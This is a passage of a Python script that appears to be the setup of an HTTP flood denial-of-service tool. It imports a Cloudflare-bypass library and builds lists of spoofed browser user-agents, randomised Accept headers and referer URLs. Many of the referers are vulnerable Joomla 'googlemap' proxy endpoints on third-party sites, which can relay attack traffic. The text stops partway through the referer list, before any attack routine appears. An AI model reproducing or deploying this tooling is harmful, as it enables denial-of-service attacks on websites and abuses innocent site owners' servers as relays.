import urllib.request, os, threading, time, random, sys
import colorama
from colorama import Fore
import threading
import requests
import cfscrape

	
useragents = ["Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/4.0; InfoPath.2; SV1; .NET CLR 2.0.50727; WOW64)",
      "Mozilla/5.0 (compatible; MSIE 10.0; Macintosh; Intel Mac OS X 10_7_3; Trident/6.0)",
      "Opera/12.0(Windows NT 5.2;U;en)Presto/22.9.168 Version/12.00",
      "Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14",
      "Mozilla/5.0 (Windows NT 6.0; rv:2.0) Gecko/20100101 Firefox/4.0 Opera 12.14",
      "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14",
      "Opera/12.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.02",
      "Opera/9.80 (Windows NT 6.1; U; es-ES) Presto/2.9.181 Version/12.00",
      "Opera/9.80 (Windows NT 5.1; U; zh-sg) Presto/2.9.181 Version/12.00",
      "Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0)","Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0 Cyberfox/52.9.1",
      "AdsBot-Google ( http://www.google.com/adsbot.html)","Avant Browser/1.2.789rel1 (http://www.avantbrowser.com)","Baiduspider ( http://www.baidu.com/search/spider.htm)",
      "BlackBerry7100i/4.1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/103","BlackBerry7520/4.0.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Browser/5.0.3.3 UP.Link/5.1.2.12 (Google WAP Proxy/1.0",
      "BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0","BlackBerry8320/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/100",
      "BlackBerry8330/4.3.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/105","BlackBerry9000/4.6.0.167 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/102",
      "BlackBerry9530/4.7.0.167 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/102 UP.Link/6.3.1.20.0","BlackBerry9700/5.0.0.351 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/123","Bloglines/3.1 (http://www.bloglines.com)","CSSCheck/1.2.2",
      "Dillo/2.0","DoCoMo/2.0 N905i(c100;TB;W24H16) (compatible; Googlebot-Mobile/2.1;  http://www.google.com/bot.html)","DoCoMo/2.0 SH901iC(c100;TB;W24H12)","Download Demon/3.5.0.11","ELinks (0.4pre5; Linux 2.6.10-ac7 i686; 80x33)",
      "everyfeed-spider/2.0 (http://www.everyfeed.com)","facebookscraper/1.0( http://www.facebook.com/sharescraper_help.php)","FAST-WebCrawler/3.8 (crawler at trd dot overture dot com; http://www.alltheweb.com/help/webmaster/crawler)",
      "FeedFetcher-Google; ( http://www.google.com/feedfetcher.html)","Gaisbot/3.0 (robot@gais.cs.ccu.edu.tw; http://gais.cs.ccu.edu.tw/robot.php)",
      "Googlebot/2.1 ( http://www.googlebot.com/bot.html)","Gulper Web Bot 0.2.4 (www.ecsl.cs.sunysb.edu/~maxim/cgi-bin/Link/GulperBot)","Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1",
			"Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
			"Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
			"Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
			"Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
			"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
			"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0",
			"Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
			"Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
			"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
			"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27",
			"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1",
			"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7",
			"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6",
			"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1",
			"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20120427 Firefox/15.0a1",
			"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b4pre) Gecko/20100815 Minefield/4.0b4pre",
			"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0a2) Gecko/20110622 Firefox/6.0a2",
			"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1",
			"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
			"Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0",
			"Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)",
			"Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016",
			"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10",
			"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7",
			"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.23) Gecko/20090825 SeaMonkey/1.1.18",
			"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10",
			"Mozilla/5.0 (Windows; U; Windows NT 5.1; tr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 ( .NET CLR 3.5.30729; .NET4.0E)",
			"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.310.0 Safari/532.9",
			"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/533.17.8 (KHTML, like Gecko) Version/5.0.1 Safari/533.17.8",
			"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.0.11) Gecko/2009060215 Firefox/3.0.11 (.NET CLR 3.5.30729)",
			"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.6 (Change: )",
			"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1",
			"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/9.0.601.0 Safari/534.14",
			"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 GTB5",
			"Mozilla/5.0 (Windows; U; Windows NT 6.0 x64; en-US; rv:1.9pre) Gecko/2008072421 Minefield/3.0.2pre",
			"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.1.17) Gecko/20110123 (like Firefox/3.x) SeaMonkey/2.0.12",
			"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.5 (KHTML, like Gecko) Chrome/4.0.249.0 Safari/532.5",
			"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5",
			"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/10.0.601.0 Safari/534.14",
			"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20",
			"Mozilla/5.0 (Windows; U; Windows XP) Gecko MultiZilla/1.6.1.0a",
			"Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.2b) Gecko/20021001 Phoenix/0.2",
			"Mozilla/5.0 (X11; FreeBSD amd64; rv:5.0) Gecko/20100101 Firefox/5.0",
			"Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.34 (KHTML, like Gecko) QupZilla/1.2.0 Safari/534.34",
			"Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Ubuntu/11.04 Chromium/14.0.825.0 Chrome/14.0.825.0 Safari/535.1",
			"Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.2 (KHTML, like Gecko) Ubuntu/11.10 Chromium/15.0.874.120 Chrome/15.0.874.120 Safari/535.2",
			"Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
			"Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
			"Mozilla/5.0 (X11; Linux i686; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
			"Mozilla/5.0 (X11; Linux i686; rv:12.0) Gecko/20100101 Firefox/12.0 ",
			"Mozilla/5.0 (X11; Linux i686; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
			"Mozilla/5.0 (X11; Linux i686; rv:2.0b6pre) Gecko/20100907 Firefox/4.0b6pre",
			"Mozilla/5.0 (X11; Linux i686; rv:5.0) Gecko/20100101 Firefox/5.0",
			"Mozilla/5.0 (X11; Linux i686; rv:6.0a2) Gecko/20110615 Firefox/6.0a2 Iceweasel/6.0a2",
			"Mozilla/5.0 (X11; Linux i686; rv:6.0) Gecko/20100101 Firefox/6.0",
			"Mozilla/5.0 (X11; Linux i686; rv:8.0) Gecko/20100101 Firefox/8.0",
			"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Ubuntu/10.10 Chromium/12.0.703.0 Chrome/12.0.703.0 Safari/534.24",
			"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.20 Safari/535.1",
			"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5",
			"Mozilla/5.0 (X11; Linux x86_64; en-US; rv:2.0b2pre) Gecko/20100712 Minefield/4.0b2pre",
			"Mozilla/5.0 (X11; Linux x86_64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1",
			"Mozilla/5.0 (X11; Linux x86_64; rv:11.0a2) Gecko/20111230 Firefox/11.0a2 Iceweasel/11.0a2",
			"Mozilla/5.0 (X11; Linux x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
			"Mozilla/5.0 (X11; Linux x86_64; rv:2.2a1pre) Gecko/20100101 Firefox/4.2a1pre",
			"Mozilla/5.0 (X11; Linux x86_64; rv:5.0) Gecko/20100101 Firefox/5.0 Iceweasel/5.0",
			"Mozilla/5.0 (X11; Linux x86_64; rv:7.0a1) Gecko/20110623 Firefox/7.0a1",
			"Mozilla/5.0 (X11; U; FreeBSD amd64; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0",
			"Mozilla/5.0 (X11; U; FreeBSD i386; de-CH; rv:1.9.2.8) Gecko/20100729 Firefox/3.6.8",
			"Mozilla/5.0 (X11; U; FreeBSD i386; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.207.0 Safari/532.0",
			"Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.6) Gecko/20040406 Galeon/1.3.15",
			"Mozilla/5.0 (X11; U; FreeBSD; i386; en-US; rv:1.7) Gecko",
			"Mozilla/5.0 (X11; U; FreeBSD x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16",
			"Mozilla/5.0 (X11; U; Linux arm7tdmi; rv:1.8.1.11) Gecko/20071130 Minimo/0.025",
			"Mozilla/5.0 (X11; U; Linux armv61; en-US; rv:1.9.1b2pre) Gecko/20081015 Fennec/1.0a1",
			"Mozilla/5.0 (X11; U; Linux armv6l; rv 1.8.1.5pre) Gecko/20070619 Minimo/0.020",
			"Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.10.1",
			"Mozilla/5.0 (X11; U; Linux i586; en-US; rv:1.7.3) Gecko/20040924 Epiphany/1.4.4 (Ubuntu)",
			"Mozilla/5.0 (X11; U; Linux i686; en-us) AppleWebKit/528.5  (KHTML, like Gecko, Safari/528.5 ) lt-GtkLauncher",
			"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.4 (KHTML, like Gecko) Chrome/4.0.237.0 Safari/532.4 Debian",
			"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.277.0 Safari/532.8",
			"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Ubuntu/10.10 Chromium/10.0.613.0 Chrome/10.0.613.0 Safari/534.15",
			"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.6) Gecko/20040614 Firefox/0.8",
			"Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Debian/1.6-7",
			"Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Epiphany/1.2.5",
			"Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Galeon/1.3.14",
			"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.7) Gecko/20060909 Firefox/1.5.0.7 MG(Novarra-Vision/6.9)",
			"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.16) Gecko/20080716 (Gentoo) Galeon/2.0.6",
			"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1) Gecko/20061024 Firefox/2.0 (Swiftfox)",
			"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.11) Gecko/2009060309 Ubuntu/9.10 (karmic) Firefox/3.0.11",
			"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Galeon/2.0.6 (Ubuntu 2.0.6-2)",
			"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.16) Gecko/20120421 Gecko Firefox/11.0",
			"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.2) Gecko/20090803 Ubuntu/9.04 (jaunty) Shiretoko/3.5.2",
			"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9a3pre) Gecko/20070330",
			"Mozilla/5.0 (X11; U; Linux i686; it; rv:1.9.2.3) Gecko/20100406 Firefox/3.6.3 (Swiftfox)",
			"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.8.1.13) Gecko/20080313 Iceape/1.1.9 (Debian-1.1.9-5)",
			"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9",
			"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15",
			"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7",
			"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0",
			"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.3) Gecko/2008092814 (Debian-3.0.1-1)",
			"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.13) Gecko/20100916 Iceape/2.0.8",
			"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.17) Gecko/20110123 SeaMonkey/2.0.12",
			"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20091020 Linux Mint/8 (Helena) Firefox/3.5.3",
			"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.5) Gecko/20091107 Firefox/3.5.5",
			"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.9) Gecko/20100915 Gentoo Firefox/3.6.9",
			"Mozilla/5.0 (X11; U; Linux x86_64; sv-SE; rv:1.8.1.12) Gecko/20080207 Ubuntu/7.10 (gutsy) Firefox/2.0.0.12",
			"Mozilla/5.0 (X11; U; Linux x86_64; us; rv:1.9.1.19) Gecko/20110430 shadowfox/7.0 (like Firefox/7.0",
			"Mozilla/5.0 (X11; U; NetBSD amd64; en-US; rv:1.9.2.15) Gecko/20110308 Namoroka/3.6.15",
			"Mozilla/5.0 (X11; U; OpenBSD arm; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0",
			"Mozilla/5.0 (X11; U; OpenBSD i386; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.359.0 Safari/533.3",
			"Mozilla/5.0 (X11; U; OpenBSD i386; en-US; rv:1.9.1) Gecko/20090702 Firefox/3.5",
			"Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.8.1.12) Gecko/20080303 SeaMonkey/1.1.8",
			"Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.9.1b3) Gecko/20090429 Firefox/3.1b3",
			"Mozilla/5.0 (X11; U; SunOS sun4m; en-US; rv:1.4b) Gecko/20030517 Mozilla Firebird/0.6",
			"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9",
			"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15",
			"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7",
			"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0",
			"Mozilla/5.0 (Linux; Android 7.1.1; MI 6 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/043807 Mobile Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
			"Mozilla/5.0 (Linux; Android 7.1.1; OD103 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN",
			"Mozilla/5.0 (Linux; Android 6.0.1; SM919 Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
			"Mozilla/5.0 (Linux; Android 5.1.1; vivo X6S A Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
			"Mozilla/5.0 (Linux; Android 5.1; HUAWEI TAG-AL00 Build/HUAWEITAG-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043622 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN",
			"Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13F69 MicroMessenger/6.6.1 NetType/4G Language/zh_CN",
			"Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_2 like Mac https://m.baidu.com/mip/c/s/zhangzifan.com/wechat-user-agent.htmlOS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C202 MicroMessenger/6.6.1 NetType/4G Language/zh_CN",
			"Mozilla/5.0 (iPhone; CPU iPhone OS 11_1_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Mobile/15B150 MicroMessenger/6.6.1 NetType/WIFI Language/zh_CN",
			"Mozilla/5.0 (iphone x Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",]

acceptall = [
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
    "Accept-Encoding: gzip, deflate\r\n",
    "Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
    "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
    "Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
    "Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
    "Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
    "Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,"
    "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
    "Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
    "Accept: text/html, application/xhtml+xml",
    "Accept-Language: en-US,en;q=0.5\r\n",
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
    "Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",]




referers = ["http://67.20.105.143/bitess/plugins/content/plugin_googlemap2_proxy.php?url=", "http://about42.nl/www/showheaders.php;POST;about42.nl.txt", "http://agenzia-anna.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=", "http://anonymouse.org/cgi-bin/anon-www.cgi/", "http://basketgbkoekelare.be/plugins/content/plugin_googlemap2_proxy.php?url=", "http://bbtoma.com/plugins/content/plugin_googlemap2_proxy.php?url=", "http://bemaxjavea.com/javea-rentals-alquileres/plugins/content/plugin_googlemap2_proxy.php?url=", "http://bike-electric.co.uk/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=", "http://browsershots.org;POST;browsershots.org.txt", "http://bwsnt1.pdsda.net/plugins/system/plugin_googlemap3_proxy.php?url=", "http://centrobrico.net/plugins/content/plugin_googlemap2_proxy.php?url=", "http://check-host.net/check-http?host=", "http://coastalcenter.net/plugins/system/plugin_googlemap2_proxy.php?url=", "http://conodeluz.org/magnanet/plugins/content/plugin_googlemap2_proxy.php?url=", "http://crawfordlivestock.com/plugins/system/plugin_googlemap2_proxy.php?url=", "http://cultura-city.rv.ua/plugins/system/plugin_googlemap3_proxy.php?url=", "http://diegoborba.com.br/andes/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=", "http://doleorganic.com/plugins/content/plugin_googlemap2_proxy.php?url=", "http://donellis.ie/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=", "http://feedvalidator.org/check.cgi?url=", "http://fets3.freetranslation.com/?Language=English%2FSpanish&Sequence=core&Url=", "http://g.cn", "http://gminazdzieszowice.pl/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=", "http://gmodules.com/ig/creator?url=", "http://google.ac", "http://google.ad", "http://google.ae", "http://google.al", "http://google.am", "http://google.as", "http://google.at", "http://google.az", "http://google.ba", "http://google.be", "http://google.bf", "http://google.bg", "http://google.bi", "http://google.bj", "http://google.bs", "http://google.by", "http://google.ca", "http://google.cat", "http://google.cc", "http://google.cd", "http://google.cf", "http://google.cg", "http://google.ch", "http://google.ci", "http://google.cl", "http://google.cm", "http://google.cn", "http://google.co.ao", "http://google.co.bw", "http://google.co.ck", "http://google.co.cr", "http://google.co.id", "http://google.co.il", "http://google.co.in", "http://google.co.jp", "http://google.co.ke", "http://google.co.kr", "http://google.co.ls", "http://google.co.ma", "http://google.co.mz", "http://google.co.nz", "http://google.co.th", "http://google.co.tz", "http://google.co.ug", "http://google.co.uk", "http://google.co.uz", "http://google.co.ve", "http://google.co.vi", "http://google.co.za", "http://google.co.zm", "http://google.co.zw", "http://google.com", "http://google.com.af", "http://google.com.ag", "http://google.com.ai", "http://google.com.ar", "http://google.com.au", "http://google.com.bd", "http://google.com.bh", "http://google.com.bn", "http://google.com.bo", "http://google.com.br", "http://google.com.bz", "http://google.com.co", "http://google.com.cu", "http://google.com.cy", "http://google.com.do", "http://google.com.ec", "http://google.com.eg", "http://google.com.et", "http://google.com.fj", "http://google.com.gh", "http://google.com.gi", "http://google.com.gt", "http://google.com.hk", "http://google.com.jm", "http://google.com.kh", "http://google.com.kw", "http://google.com.lb", "http://google.com.lc", "http://google.com.ly", "http://google.com.mm", "http://google.com.mt", "http://google.com.mx", "http://google.com.my", "http://google.com.na", "http://google.com.nf", "http://google.com.ng", "http://google.com.ni", "http://google.com.np", "http://google.com.om", "http://google.com.pa", "http://google.com.pe", "http://google.com.pg", "http://google.com.ph", "http://google.com.pk", "http://google.com.pr", "http://google.com.py", "http://google.com.qa", "http://google.com.sa", "http://google.com.sb", "http://google.com.sg", "http://google.com.sl", "http://google.com.sv", "http://google.com.tj", "http://google.com.tn", "http://google.com.tr", "http://google.com.tw", "http://google.com.ua", "http://google.com.uy", "http://google.com.vc", "http://google.com.vn", "http://google.cv", "http://google.cz", "http://google.de", "http://google.dj", "http://google.dk", "http://google.dm", "http://google.dz", "http://google.ee", "http://google.es", "http://google.fi", "http://google.fm", "http://google.fr", "http://google.ga", "http://google.ge", "http://google.gf", "http://google.gg", "http://google.gl", "http://google.gm", "http://google.gp", "http://google.gr", "http://google.gy", "http://google.hn", "http://google.hr", "http://google.ht", "http://google.hu", "http://google.ie", "http://google.im", "http://google.io", "http://google.iq", "http://google.is", "http://google.it", "http://google.je", "http://google.jo", "http://google.kg", "http://google.ki", "http://google.kz", "http://google.la", "http://google.li", "http://google.lk", "http://google.lt", "http://google.lu", "http://google.lv", "http://google.md", "http://google.me", "http://google.mg", "http://google.mk", "http://google.ml", "http://google.mn", "http://google.ms", "http://google.mu", "http://google.mv", "http://google.mw", "http://google.ne", "http://google.nl", "http://google.no", "http://google.nr", "http://google.nu", "http://google.pl", "http://google.pn", "http://google.ps", "http://google.pt", "http://google.ro", "http://google.rs", "http://google.ru", "http://google.rw", "http://google.sc", "http://google.se", "http://google.sh", "http://google.si", "http://google.sk", "http://google.sm", "http://google.sn", "http://google.so", "http://google.st", "http://google.td", "http://google.tg", "http://google.tk", "http://google.tl", "http://google.tm", "http://google.to", "http://google.tt", "http://google.us", "http://google.vg", "http://google.vu", "http://google.ws", "http://grandsultansaloon.com/plugins/system/plugin_googlemap2_proxy.php?url=", "http://greenappledentaldt.com/home/templates/plugins/content/plugin_googlemap2_proxy.php?url=", "http://help.baidu.com/searchResult?keywords=", "http://host-tracker.com/check_page/?furl=", "http://hotel-veles.com/plugins/content/plugin_googlemap2_proxy.php?url=", 